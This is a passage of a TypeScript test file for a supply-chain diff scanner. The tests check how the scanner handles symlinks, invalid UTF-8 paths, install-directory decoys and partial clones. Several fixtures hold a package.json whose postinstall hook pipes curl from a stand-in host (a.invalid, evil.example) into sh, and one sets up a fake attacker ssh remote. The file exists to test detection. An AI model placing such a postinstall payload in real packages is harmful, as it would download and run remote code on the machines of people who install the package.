  symlinkSync(join(out, "fifo"), join(head, "package.json"));
  mkdirSync(join(head, "a"));
  symlinkSync(join(out, "pkg.json"), join(head, "a", "package.json"));
  // In a child process: before the fix, opening the FIFO blocks forever.
  const cli = join(import.meta.dirname, "..", "src", "cli.js");
  const r = spawnSync(process.execPath, [cli, "diff", `dir:${base}`, `dir:${head}`, "--format", "json"], { encoding: "utf8", timeout: 10_000 });
  assert.equal(r.signal, null, "finished");
  const f = (JSON.parse(r.stdout) as { findings: { ruleId: string; file: string; message: string }[] }).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), ["WS-DF-006 a/package.json", "WS-DF-006 package.json"]);
  assert.ok(!r.stdout.includes("SECRET-OUTSIDE"), "a file outside the root is never read");
  // Unchanged, yet reported: an edit to the file outside is not in either directory.
  const same = spawnSync(process.execPath, [cli, "diff", `dir:${head}`, `dir:${head}`, "--format", "json"], { encoding: "utf8", timeout: 10_000 });
  const g = (JSON.parse(same.stdout) as { findings: { ruleId: string; file: string }[] }).findings;
  assert.deepEqual(g.map((x) => `${x.ruleId} ${x.file}`).sort(), ["WS-DF-006 a/package.json", "WS-DF-006 package.json"]);
});

test("only diff, which also takes directories, suggests the dir: prefix", () => {
  const d = gitRepo(() => undefined);
  mkdirSync(join(d, "base"));
  const cwd = process.cwd();
  process.chdir(d);
  try {
    assert.throws(() => resolveTree("base", d), /write dir:base/);
    assert.throws(() => gitTree(d, "base"), (e: Error) => /cannot resolve/.test(e.message) && !e.message.includes("dir:"));
  } finally {
    process.chdir(cwd);
  }
});

/** Like indexRepo, but paths and contents are raw bytes, which a file system such as APFS may refuse as names. */
function rawRepo(entries: [Buffer, string, Buffer][]): string {
  const d = mkdtempSync(join(tmpdir(), "ws-tree-"));
  const git = (args: string[], input?: Buffer) => runFed("git", [...GIT_AS_T, ...args], input, d);
  git(["init", "-q", "-b", "main"]);
  const lines = entries.map(([path, mode, content]) => Buffer.concat([Buffer.from(`${mode} ${git(["hash-object", "-w", "--stdin"], content).trim()}\t`), path, Buffer.from([0])]));
  git(["update-index", "-z", "--index-info"], Buffer.concat(lines));
  git(["commit", "-q", "-m", "c0"]);
  return d;
}

test("a link or path through a name that is not valid UTF-8 is not followed: decoded, it names no entry byte for byte", () => {
  const evil = Buffer.from(JSON.stringify({ name: "p", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } }));
  const pkg = Buffer.from('{"name":"p"}');
  const raw = (...parts: (string | number)[]) => Buffer.concat(parts.map((x) => (typeof x === "number" ? Buffer.from([x]) : Buffer.from(x))));
  const t = gitTree(
    rawRepo([
      // On Linux the OS opens \xfe.j; decoded, \xfe.j and the decoy \xff.j are both "\ufffd.j".
      [raw(0xfe, ".j"), "100644", evil],
      [raw(0xff, ".j"), "100644", pkg],
      [raw("package.json"), "120000", raw(0xfe, ".j")],
      [raw(0xfe, "/package.json"), "100644", evil],
      // A link named like a binary lockfile: its target \xff must not be read as latin1 "ÿ", the decoy's name.
      [raw(0xff), "100644", raw("changed")],
      [raw("ÿ"), "100644", raw("decoy")],
      [raw("bun.lockb"), "120000", raw(0xff)],
      [raw("ok/package.json"), "120000", raw("../ÿ.json")],
      [raw("ÿ.json"), "100644", pkg],
    ]),
    "HEAD",
  );
  const f = diffTrees(t, t, testCtx()).findings.map((x) => `${x.ruleId} ${x.file}`);
  assert.deepEqual(f.sort(), ["WS-DF-006 bun.lockb", "WS-DF-006 package.json", "WS-DF-006 \ufffd/package.json"]);
  assert.equal(t.read("ok/package.json"), pkg.toString(), "positive control: a valid non-ASCII name is followed");
});

test("a tracked decoy in the directory pnpm's modulesDir or yarn's --modules-folder names is not followed", () => {
  const evil = JSON.stringify({ name: "c", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const repo = (config: readonly [string, string]) =>
    gitRepo(
      (d) => {
        writeFileSync(join(d, "package.json"), JSON.stringify({ name: "root", private: true, workspaces: ["packages/*"] }));
        mkdirSync(dirname(join(d, config[0])), { recursive: true });
        writeFileSync(join(d, config[0]), config[1]);
        for (const p of ["c", "w"]) mkdirSync(join(d, "packages", p), { recursive: true });
        writeFileSync(join(d, "packages", "w", "package.json"), '{"name":"w","version":"1.0.0"}');
        writeFileSync(join(d, "packages", "w", "notes.json"), '{"name":"c","version":"1.0.0"}');
        mkdirSync(join(d, "mods", "w"), { recursive: true }); // tracked
        writeFileSync(join(d, "mods", "w", "notes.json"), '{"name":"c","version":"1.0.0"}');
        symlinkSync("../../mods/w/notes.json", join(d, "packages", "c", "package.json"));
      },
      (d) => writeFileSync(join(d, "packages", "w", "notes.json"), evil), // only the real target changes
    );
  for (const config of [
    ["pnpm-workspace.yaml", "packages:\n  - packages/*\nmodulesDir: mods\n"],
    ["sub/.yarnrc", '--modules-folder "mods"\n'],
    [".npmrc", "modules-dir=mods\n"],
  ] as const) {
    const d = repo(config);
    // pnpm 11.16.0 (10.34.6 for .npmrc) moves the tracked mods/w aside to mods/.ignored_w and links the workspace there.
    rmSync(join(d, "mods", "w"), { recursive: true });
    symlinkSync("../packages/w", join(d, "mods", "w"));
    assert.equal(readFileSync(join(d, "packages", "c", "package.json"), "utf8"), evil, "the premise");
    const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
    assert.ok(f.some((x) => x.ruleId === "WS-DF-006" && x.file === "packages/c/package.json"), config[0]);
  }
  const d = repo(["pnpm-workspace.yaml", "packages:\n  - packages/*\n"]);
  const f = diffTrees(gitTree(d, "HEAD~1"), gitTree(d, "HEAD"), testCtx()).findings;
  assert.ok(!f.some((x) => x.file === "packages/c/package.json"), "positive control: without the setting, mods is followed");
});

test("an install-directory setting not read plainly fails closed: no path is followed", () => {
  const notChecked = (config: string, text: string, mode = "100644") => {
    const t = gitTree(indexRepo([["package.json", "100644", '{"name":"p"}'], [config, mode, text]]), "HEAD");
    return diffTrees(t, t, testCtx()).findings.some((x) => x.ruleId === "WS-DF-006" && x.file === "package.json");
  };
  for (const text of ["modulesDir: *dir\n", '"modules\\u0044ir": mods\n', "{packages: [a], modulesDir: mods}\n", "modulesDir: .\n", "modulesDir: 'a/..'\n", "modulesDir: mods # deps\n", "modulesDir: mods\n  x\n", "modulesDir: mods\n\n  x\n"]) {
    assert.ok(notChecked("pnpm-workspace.yaml", text), text);
  }
  assert.ok(notChecked("a/.yarnrc", "--modules-folder=mods\n"), "a yarn form not read here");
  // pnpm 10.34.6 reads all three as modules-dir.
  for (const text of ["MODULES-DIR=mods\n", "modules_dir=mods\n", "  modules-dir = mods\n"]) assert.ok(notChecked(".npmrc", text), text);
  for (const text of ["modules-dir=mods\n", "modules-dir = 'mods'\r\n", "ignore-scripts=true\n"]) assert.ok(!notChecked(".npmrc", text), `positive control: ${text}`);
  assert.ok(notChecked("pnpm-workspace.yaml", "real.yaml", "120000"), "a linked config may hold anything");
  for (const text of ["packages:\n  - packages/*\n", "modulesDir: mods\n", "modulesDir: '../x/y' \r\n", "modulesDir: mods\n \npackages:\n  - a\n"]) {
    assert.ok(!notChecked("pnpm-workspace.yaml", text), `positive control: ${JSON.stringify(text)}`);
  }
  assert.ok(!notChecked(".yarnrc", "--install.modules-folder m3\n"), "positive control: yarn");
});

test("a tree whose install-directory setting is not read plainly still reads its regular files: removing them is seen", () => {
  const d = gitRepo(
    (d) => {
      // Benign: pnpm 11.16.0 still installs into node_modules. It mentions the key, so this tree follows no link.
      writeFileSync(join(d, "pnpm-workspace.yaml"), "packages:\n  - packages/*\n# modulesDir is left at its default\n");
      writeFileSync(join(d, ".npmrc"), "ignore-scripts=true\n");
      writeFileSync(join(d, "package-lock.json"), '{"lockfileVersion":3,"packages":{}}');
    },
    (d) => {
      for (const p of ["pnpm-workspace.yaml", ".npmrc", "package-lock.json"]) unlinkSync(join(d, p));
    },
  );
  const base = gitTree(d, "HEAD~1");
  assert.ok(base.unfollowed?.(".npmrc") !== undefined, "the premise: the base tree follows nothing");
  const f = diffTrees(base, gitTree(d, "HEAD"), testCtx()).findings.map((x) => `${x.ruleId} ${x.file} ${x.message.split(" ")[1]}`);
  assert.deepEqual(f.sort(), ["WS-DF-005 .npmrc removed", "WS-DF-005 package-lock.json removed", "WS-DF-005 pnpm-workspace.yaml removed"]);
});

test("a config file under node_modules neither names nor hides install directories, and the change behind the link is still reported", () => {
  const evil = JSON.stringify({ name: "c", version: "1.0.0", scripts: { postinstall: "curl -s https://a.invalid/x | sh" } });
  const d = gitRepo(
    (d) => {
      writeFileSync(join(d, "package.json"), JSON.stringify({ name: "root", private: true, dependencies: { w: "workspace:*" } }));
      writeFileSync(join(d, "pnpm-workspace.yaml"), "packages:\n  - packages/*\nmodulesDir: mods\n");
      // Not config to pnpm, and list() leaves node_modules out: it must neither add nor remove install directories.
      mkdirSync(join(d, "node_modules", "x"), { recursive: true });
      writeFileSync(join(d, "node_modules", "x", "pnpm-workspace.yaml"), "# modulesDir is left at its default\n");
      for (const p of ["c", "w"]) mkdirSync(join(d, "packages", p), { recursive: true });
      writeFileSync(join(d, "packages", "w", "package.json"), '{"name":"w","version":"1.0.0"}');
      writeFileSync(join(d, "packages", "w", "notes.json"), '{"name":"c","version":"1.0.0"}');
      mkdirSync(join(d, "mods", "w"), { recursive: true });
      writeFileSync(join(d, "mods", "w", "notes.json"), evil); // the decoy: pnpm 11.16.0 moves it aside
      symlinkSync("../../mods/w/notes.json", join(d, "packages", "c", "package.json"));
    },
    (d) => {
      unlinkSync(join(d, "node_modules", "x", "pnpm-workspace.yaml"));
      unlinkSync(join(d, "packages", "c", "package.json"));
      writeFileSync(join(d, "packages", "c", "package.json"), evil);
    },
  );
  const base = gitTree(d, "HEAD~1");
  assert.equal(base.unfollowed?.("package.json"), undefined, "the node_modules file does not make the whole base unfollowable");
  assert.ok(base.unfollowed?.("packages/c/package.json") !== undefined, "the root modulesDir still makes the link into mods unfollowable");
  const f = diffTrees(base, gitTree(d, "HEAD"), testCtx()).findings;
  assert.ok(f.some((x) => x.file === "packages/c/package.json"), JSON.stringify(f.map((x) => `${x.ruleId} ${x.file}`)));
  assert.equal(base.read("pnpm-workspace.yaml"), "packages:\n  - packages/*\nmodulesDir: mods\n", "positive control: a regular file is read");
});

test("an install-directory setting inside node_modules is ignored, so it cannot hide a regular file from diff", () => {
  const lock = '{"lockfileVersion":3,"packages":{}}';
  const t = gitTree(indexRepo([["package.json", "100644", '{"name":"p"}'], ["node_modules/x/.npmrc", "100644", "modules-dir=sub\n"], ["sub/package-lock.json", "100644", lock]]), "HEAD");
  assert.equal(t.read("sub/package-lock.json"), lock);
  const control = gitTree(indexRepo([["package.json", "100644", '{"name":"p"}'], [".npmrc", "100644", "modules-dir=sub\n"], ["sub/package-lock.json", "100644", lock]]), "HEAD");
  assert.equal(control.read("sub/package-lock.json"), undefined, "positive control: a project-level setting still makes sub install-owned");
});

test("a base whose install-directory setting cannot be read follows no link: the link reads as its own text", () => {
  const d = gitRepo((d) => {
    writeFileSync(join(d, "package.json"), '{"name":"root","private":true}');
    writeFileSync(join(d, ".npmrc"), "modules-dir=${X}\n");
    mkdirSync(join(d, "pkg"));
    writeFileSync(join(d, "real.json"), '{"name":"real","version":"1.0.0"}');
    symlinkSync("../real.json", join(d, "pkg", "package.json"));
  });
  const t = gitTree(d, "HEAD");
  assert.equal(t.read("pkg/package.json"), "../real.json");
  assert.ok(t.unfollowed?.("pkg/package.json") !== undefined);
  assert.equal(t.read("real.json"), '{"name":"real","version":"1.0.0"}', "positive control: a regular file is read");
});

/**
 * A partial clone (`--filter=blob:none`, as actions/checkout's `filter` makes) holds no blob until git fetches it on
 * demand from the promisor remote. diff must neither fetch (over the network, with transport settings the
 * repository's own .git/config names) nor read a blob it lacks as an absent file, which made a change to it pass.
 */
test("diff: a blob a partial clone lacks stops the run (exit 2) and is never fetched, whatever transport the repository names", async () => {
  const evil = JSON.stringify({ name: "p", scripts: { postinstall: "curl http://evil.example/x | sh" } });
  const origin = gitRepo(
    (d) => writeFileSync(join(d, "package.json"), '{"name":"p"}'),
    (d) => writeFileSync(join(d, "package.json"), evil),
  );
  execFileSync("git", ["-C", origin, "config", "uploadpack.allowFilter", "true"]);
  const parent = mkdtempSync(join(tmpdir(), "ws-tree-partial-"));
  const clone = (name: string): string => {
    const c = join(parent, name);
    execFileSync("git", ["-c", "protocol.file.allow=always", "clone", "-q", "--no-checkout", "--filter=blob:none", `file://${origin}`, c], { stdio: "pipe" });
    return c;
  };
  const diff = async (dir: string) => {
    const io = fakeIO();
    const code = await run(["diff", "HEAD~1", "HEAD", "--dir", dir, "--no-baseline", "--iocs", fx("iocs")], io);
    return { code, out: io.out, err: io.err };
  };
  // The promisor cannot be reached: before the fix, "0 finding(s)" and exit 0.
  const gone = clone("gone");
  execFileSync("git", ["-C", gone, "config", "remote.origin.url", "file:///nonexistent/x.git"]);
  const r = await diff(gone);
  assert.equal(r.code, 2, r.out);
  assert.match(r.err, /git could not read package\.json at HEAD(~1)? \([0-9a-f]{12}\): .*full clone/);
  // The repository names an ssh remote and its own ssh program: nothing runs it.
  const hostile = clone("hostile");
  const marker = join(parent, "MARKER");
  const ssh = join(parent, "ssh.sh");
  writeFileSync(ssh, `#!/bin/sh\necho "ran: $*" > "${marker}"\nexit 1\n`, { mode: 0o755 });
  execFileSync("git", ["-C", hostile, "config", "remote.origin.url", "ssh://attacker.invalid/repo.git"]);
  execFileSync("git", ["-C", hostile, "config", "core.sshCommand", ssh]);
  const h = await diff(hostile);
  assert.equal(h.code, 2, h.out);
  assert.equal(existsSync(marker), false, existsSync(marker) ? readFileSync(marker, "utf8") : "");
  // Control: the full repository reports the change.
  const full = await diff(origin);
  assert.equal(full.code, 1, full.err);
  assert.match(full.out, /WS-LC-002/);
});

test("gitTree's Tree.entry keeps a file it has read, up to MAX_CACHED_ENTRY_BYTES in all; one past it is read again, alike", () => {
  const d = gitRepo((d) => {
    writeFileSync(join(d, "small.py"), "x = 1\n");
    // Zeros: git stores them in a few kilobytes, and the test stays fast.
    writeFileSync(join(d, "big.py"), Buffer.alloc(MAX_CACHED_ENTRY_BYTES + 1));
  });
  const t = gitTree(d, "HEAD");
  const small = t.entry?.("small.py");
  assert.equal(small?.kind, "file");
  assert.equal(t.entry?.("small.py"), small, "kept: the same object");
  const [a, b] = [t.entry?.("big.py"), t.entry?.("big.py")];
  assert.ok(a?.kind === "file" && b?.kind === "file");
  assert.notEqual(a, b, "not kept: read again");
  assert.equal(a.bytes.length, MAX_CACHED_ENTRY_BYTES + 1);
  assert.ok(a.bytes.equals(b.bytes), "the same answer either way");
});
